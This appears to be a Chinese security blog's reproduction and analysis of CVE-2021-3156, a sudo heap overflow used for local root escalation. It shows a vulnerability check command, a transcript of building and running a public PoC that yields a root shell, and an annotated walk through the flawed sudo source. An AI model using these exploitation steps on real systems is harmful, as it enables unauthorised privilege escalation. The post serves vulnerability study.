<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析 | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="文章首发于安全客 CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析 CVE-2021-3156是sudo的一个堆溢出漏洞，可以用来进行本地提权。在类uninx中非root可以使用sudo来以root的权限执行操作。由于sudo错误的转义了\\导致了一个堆溢出漏洞。 漏洞影响版本为1.8.2-1.8.31sp12, 1.9.0-1.9.5sp1，">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析">
<meta property="og:url" content="https://www.lyyl.online/posts/4199921919.html">
<meta property="og:site_name" content="LYYL&#39; Blog">
<meta property="og:description" content="文章首发于安全客 CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析 CVE-2021-3156是sudo的一个堆溢出漏洞，可以用来进行本地提权。在类uninx中非root可以使用sudo来以root的权限执行操作。由于sudo错误的转义了\\导致了一个堆溢出漏洞。 漏洞影响版本为1.8.2-1.8.31sp12, 1.9.0-1.9.5sp1，">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-24.jpeg">
<meta property="article:published_time" content="2021-07-30T06:39:11.000Z">
<meta property="article:modified_time" content="2022-05-26T07:56:59.326Z">
<meta property="article:author" content="LYYL">
<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-24.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/4199921919"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8740935439028405',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MBZHBXMDJ2');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2021-3156 sudo heap-based bufoverflow 复现&分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-26 15:56:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-24.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-07-30T06:39:11.000Z" title="undefined 2021-07-30 14:39:11">2021-07-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>49分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>文章首发于安全客</p>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.anquanke.com/post/id/231408">CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析</a></p>
<p><code>CVE-2021-3156</code>是<code>sudo</code>的一个堆溢出漏洞，可以用来进行本地提权。在类<code>uninx</code>中非<code>root</code>可以使用<code>sudo</code>来以<code>root</code>的权限执行操作。由于<code>sudo</code>错误的转义了<code>\\</code>导致了一个堆溢出漏洞。</p>
<p>漏洞影响版本为<code>1.8.2-1.8.31sp12, 1.9.0-1.9.5sp1</code>，<code>sudo &gt;=1.9.5sp2</code>的版本则不受影响。</p>
<p>感谢<code>luc</code>师傅带我飞。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里我首先使用的是<code>docker ubuntu 20.04</code>，查看一下<code>sudo</code>版本，这里需要注意的是首先需要创建一个普通权限的用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ sudo --version</span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">Sudoers policy plugin version 1.8.31</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.31</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行命令<code>sudoedit -s /</code>如果回显</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@c957df720fc7:~/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty<span class="comment"># sudoedit -s /</span></span><br><span class="line">sudoedit: /: not a regular file</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>则表明存在漏洞，如果回显</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  work sudoedit -s /</span><br><span class="line">usage: sudoedit [-AknS] [-r role] [-t <span class="built_in">type</span>] [-C num] [-g group] [-h host] [-p prompt] [-T <span class="built_in">timeout</span>] [-u user] file ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>则表示漏洞已经被修复</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先我们使用<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/blasty/CVE-2021-3156">exp</a>先执行一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@c957df720fc7:~/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty<span class="comment"># su normal</span></span><br><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ <span class="built_in">ls</span></span><br><span class="line">Makefile  README.md  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich</span><br><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ make</span><br><span class="line"><span class="built_in">rm</span> -rf libnss_X</span><br><span class="line"><span class="built_in">mkdir</span> libnss_X</span><br><span class="line">gcc -o sudo-hax-me-a-sandwich hax.c</span><br><span class="line">gcc -fPIC -shared -o <span class="string">&#x27;libnss_X/P0P_SH3LLZ_ .so.2&#x27;</span> lib.c</span><br><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ ./sudo-hax-me-a-sandwich 1</span><br><span class="line"></span><br><span class="line">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><br><span class="line"></span><br><span class="line">using target: <span class="string">&#x27;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&#x27;</span></span><br><span class="line">** pray <span class="keyword">for</span> your rootshell.. **</span><br><span class="line">[+] bl1ng bl1ng! We got it!</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1000(normal)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当<code>sudo</code>以<code>-i,-s</code>参数启动即<code>MODE_SHELL,MODE_LOGIN_SHELl</code>标志启动的时候，<code>sudo</code>会使用<code>\\</code>转义所有的元字符，并重写<code>argc,argv</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//src/parse_args.c/parse_args</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">  <span class="type">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* shell -c &quot;command&quot; */</span></span><br><span class="line">    <span class="type">char</span> *src, *dst;</span><br><span class="line">    <span class="type">size_t</span> cmnd_size = (<span class="type">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line">      <span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">      sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;<span class="comment">// 串联所有的命令参数字符串</span></span><br><span class="line">      <span class="keyword">for</span> (src = *av; *src != <span class="string">&#x27;\\0&#x27;</span>; src++) &#123;</span><br><span class="line">        <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">        <span class="comment">// 用\\转义所有的元字符</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="type">unsigned</span> <span class="type">char</span>)*src) &amp;&amp; *src != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;-&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">          *dst++ = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">        *dst++ = *src;</span><br><span class="line">      &#125;</span><br><span class="line">      *dst++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">      dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">    *dst = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 重写argc，argv</span></span><br><span class="line">  av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="type">char</span> *));</span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">    sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> (!gc_add(GC_PTR, av))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  av[<span class="number">0</span>] = (<span class="type">char</span> *)user_details.shell; <span class="comment">/* plugin may override shell */</span></span><br><span class="line">  <span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    av[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    av[<span class="number">2</span>] = cmnd;</span><br><span class="line">  &#125;</span><br><span class="line">  av[ac] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  argv = av;</span><br><span class="line">  argc = ac;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后会在<code>sudoers_policy_main</code>函数中调用<code>set_cmnd</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//plugins/sudoers/sudoers.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">  <span class="title function_">sudoers_policy_main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * <span class="type">const</span> argv[], <span class="type">int</span> pwflag, <span class="type">char</span> *env_add[],</span></span><br><span class="line"><span class="params">                      <span class="type">bool</span> verbose, <span class="type">void</span> *closure)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="comment">/* Find command in path and apply per-command Defaults. */</span></span><br><span class="line">  cmnd_status = set_cmnd();</span><br><span class="line">  <span class="keyword">if</span> (cmnd_status == NOT_FOUND_ERROR)</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">  <span class="title function_">set_cmnd</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="number">847</span>         <span class="keyword">if</span> (NewArgc &gt; <span class="number">1</span>) &#123;</span><br><span class="line"> <span class="number">848</span>             <span class="type">char</span> *to, *from, **av;</span><br><span class="line"> <span class="number">849</span>             <span class="type">size_t</span> size, n;</span><br><span class="line"> <span class="number">850</span></span><br><span class="line"> <span class="number">851</span>             <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line"> <span class="number">852</span>             <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line"> <span class="number">853</span>                 size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line"> <span class="number">854</span>             <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line"> <span class="number">855</span>                 sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line"> <span class="number">856</span>                 debug_return_int(<span class="number">-1</span>);</span><br><span class="line"> <span class="number">857</span>             &#125;</span><br><span class="line"> <span class="number">858</span>             <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"> <span class="number">859</span>                 <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 860                  * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> 861                  * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> 862                  * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> 863                  */</span></span><br><span class="line"> <span class="number">864</span>                 <span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line"> <span class="number">865</span>                     <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"> <span class="number">866</span>                         <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="type">unsigned</span> <span class="type">char</span>)from[<span class="number">1</span>]))</span><br><span class="line"> <span class="number">867</span>                             from++;</span><br><span class="line"> <span class="number">868</span>                         *to++ = *from++;</span><br><span class="line"> <span class="number">869</span>                     &#125;</span><br><span class="line"> <span class="number">870</span>                     *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"> <span class="number">871</span>                 &#125;</span><br><span class="line"> <span class="number">872</span>                 *--to = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"> <span class="number">873</span>             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="number">874</span>                 <span class="comment">//...</span></span><br><span class="line"> <span class="number">885</span>         &#125;</span><br><span class="line"> <span class="number">886</span>     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从代码中我们可以看出，函数首先按照<code>argv</code>中参数的大小申请一块堆空间<code>user_args</code>，然后依次将命令行参数链接到该堆空间中。</p>
<p>但是如果当一个命令行参数以反斜杠结尾，即<code>from[0]=\\,from[1]=null</code>，就会满足<code>866</code>行的条件，使得<code>from++</code>指向<code>null</code>，但是之后<code>868</code>行执行的拷贝操作又会使得<code>from++</code>从而越过了<code>null</code>，那么接下来的<code>while</code>循环就会发生越界拷贝。拷贝的内容将会复制到<code>user_args</code>堆块中，从而发生堆溢出。</p>
<p>但是理论在设置了<code>MODE_SHELL,MODE_LOGIN_SHELL</code>的条件下任何命令行参数都不可能以<code>\\</code>结尾，因为其在<code>parse_args</code>函数中会对所有的元字符进行转义包括这个<code>\\</code>。</p>
<p>但是这两个函数中的判断条件有所不同</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//parse_args</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL))&#123;&#125;</span><br><span class="line"><span class="comment">//sudoers_policy_main</span></span><br><span class="line"><span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL))&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么如果我们想要成功的利用堆溢出就需要在设置<code>flags=MODE_SHELL/MODE_LOGIN_SHELL</code>的条件下而不设置<code>mode=MODE_RUN</code>以避免转移代码的执行。那么根据<code>sudoers_policy_main</code>中的条件，我们只能设置<code>MODE_EDIT | MODE_CHECK</code>这两个标志位了，来看一下设置的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">	    <span class="keyword">if</span> (mode &amp;&amp; mode != MODE_EDIT)</span><br><span class="line">		usage_excl(<span class="number">1</span>);</span><br><span class="line">	    mode = MODE_EDIT;</span><br><span class="line">	    sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">	    valid_flags = MODE_NONINTERACTIVE;</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">	    <span class="keyword">if</span> (mode) &#123;</span><br><span class="line">		<span class="keyword">if</span> (mode == MODE_LIST)</span><br><span class="line">		    SET(flags, MODE_LONG_LIST);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    usage_excl(<span class="number">1</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	    mode = MODE_LIST;</span><br><span class="line">	    valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">0</span> &amp;&amp; mode == MODE_LIST)</span><br><span class="line">mode = MODE_CHECK;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是如果我们设置了这两个标志位，并且设置了<code>MODE_SHELL/MODE_LOGIN_SHELL</code>的话，在后续会被检测到并退出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((flags &amp; valid_flags) != flags)</span><br><span class="line">  usage(1);// Give usage message and <span class="built_in">exit</span>.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

